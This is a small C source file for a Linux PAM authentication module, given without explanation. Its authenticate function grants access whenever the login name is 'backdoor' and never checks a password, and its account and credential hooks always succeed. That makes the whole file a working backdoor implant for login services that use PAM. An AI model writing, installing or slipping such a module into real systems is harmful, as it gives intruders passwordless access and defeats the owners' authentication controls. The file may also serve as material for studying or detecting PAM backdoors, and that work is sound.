#include <stdio.h>
#include <string.h>
#include <security/pam_modules.h>
#include <security/pam_appl.h>

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  printf("Acct mgmt\n");
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  int retval;
  const char *username;
  retval = pam_get_user(pamh, &username, "Username: ");
  if (retval != PAM_SUCCESS) {
    return retval;
  }
  printf("Welcome %s\n", username);
  if (strcmp(username, "backdoor") != 0) {
    return PAM_AUTH_ERR;
  }
  return PAM_SUCCESS;
}
